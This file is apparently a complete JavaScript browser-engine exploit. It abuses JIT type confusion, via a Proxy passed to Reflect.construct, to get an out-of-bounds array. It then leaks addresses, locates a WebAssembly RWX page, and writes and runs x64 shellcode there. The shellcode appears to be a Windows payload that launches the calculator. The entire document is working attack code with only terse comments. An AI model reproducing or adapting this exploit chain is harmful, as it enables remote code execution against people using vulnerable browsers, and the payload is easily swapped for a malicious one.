let typeConfused = [1.1, , , , , , , , , , , , , , , , , , , , , 1.1, 2.2, 3.3];
let oobArray;

function empty() {}
function f(arg) {
  typeConfused.push(
    typeof Reflect.construct(empty, arguments, arg) === Proxy
      ? 1.1
      : -1.188595395352662e148
  );
  for (let i = 0; i < 0x10000; ++i) {}
}

function main(arg) {
  for (let i = 0; i < 0x10000; ++i) {}
  f(arg);
}

let vulnProxy = new Proxy(Object, {
  get: function () {
    typeConfused[0] = {}; // convert a to holey elements array
    oobArray = [1.1, 2.2, 3.3, 4.4];
    return Object.prototype;
  },
});

typeConfused.pop();
typeConfused.pop();
typeConfused.pop();
for (let i = 0; i < 0x10000; ++i) {
  empty();
}

main(empty);
main(empty);
main(vulnProxy); // triggers the vuln

let relative = [1.1, 2.2];
let primitive = new ArrayBuffer(0x1000);
let dataView = new DataView(primitive);
let bigUint64View = new BigUint64Array(primitive);
let float64View = new Float64Array(primitive);
let addrOfArray = [primitive, primitive, primitive];
oobArray[58] = 0; // clears addrOfArray[0], addrOfArray[1]

let wasmCode = new Uint8Array([
  0,
  97,
  115,
  109,
  1,
  0,
  0,
  0,
  1,
  7,
  1,
  96,
  2,
  127,
  127,
  1,
  127,
  3,
  2,
  1,
  0,
  4,
  4,
  1,
  112,
  0,
  0,
  5,
  3,
  1,
  0,
  1,
  7,
  21,
  2,
  6,
  109,
  101,
  109,
  111,
  114,
  121,
  2,
  0,
  8,
  95,
  90,
  51,
  97,
  100,
  100,
  105,
  105,
  0,
  0,
  10,
  9,
  1,
  7,
  0,
  32,
  1,
  32,
  0,
  106,
  11,
]);
let wasmMod = new WebAssembly.Instance(new WebAssembly.Module(wasmCode), {});
let wasmFunc = wasmMod.exports._Z3addii;

// leak the address of webassembly module
addrOfArray[0] = wasmFunc;
float64View[0] = oobArray[58];
console.log("[*] wasm module relatively @ 0x" + bigUint64View[0].toString(16));

// leak the address of rwx page
let originalPtr = oobArray[16];
bigUint64View[0] -= 0xc0n;
bigUint64View[0] = bigUint64View[0] << 32n;
oobArray[16] = float64View[0];
float64View[0] = relative[0];
oobArray[16] = originalPtr;
console.log("[*] rwx page @ 0x" + bigUint64View[0].toString(16));

// write shellcode to rwx page
let shellcode = [
  0xe7894954,
  0xe48348fc,
  0x00c0e8f0,
  0x51410000,
  0x51525041,
  0xd2314856,
  0x528b4865,
  0x528b4860,
  0x528b4818,
  0x728b4820,
  0xb70f4850,
  0x314d4a4a,
  0xc03148c9,
  0x7c613cac,
  0x41202c02,
  0x410dc9c1,
  0xede2c101,
  0x48514152,
  0x8b20528b,
  0x01483c42,
  0x88808bd0,
  0x48000000,
  0x6774c085,
  0x50d00148,
  0x4418488b,
  0x4920408b,
  0x56e3d001,
  0x41c9ff48,
  0x4888348b,
  0x314dd601,
  0xc03148c9,
  0xc9c141ac,
  0xc101410d,
  0xf175e038,
  0x244c034c,
  0xd1394508,
  0x4458d875,
  0x4924408b,
  0x4166d001,
  0x44480c8b,
  0x491c408b,
  0x8b41d001,
  0x01488804,
  0x415841d0,
  0x5a595e58,
  0x59415841,
  0x83485a41,
  0x524120ec,
  0x4158e0ff,
  0x8b485a59,
  0xff57e912,
  0x485dffff,
  0x000001ba,
  0x00000000,
  0x8d8d4800,
  0x00000101,
  0x8b31ba41,
  0xd5ff876f,
  0xa2b5f0bb,
  0xa6ba4156,
  0xff9dbd95,
  0xc48348d5,
  0x7c063c28,
  0xe0fb800a,
  0x47bb0575,
  0x6a6f7213,
  0x894c9000,
  0x63c35dfc,
  0x00636c61,
];

oobArray[24] = float64View[0];
for (let i = 0; i < shellcode.length; ++i) {
  dataView.setUint32(4 * i, shellcode[i], true);
}

wasmFunc(0, 2); // run shellcode
wasmFunc = null;
dataView.length = null;
primitive = null;
oobArray.length = 0;
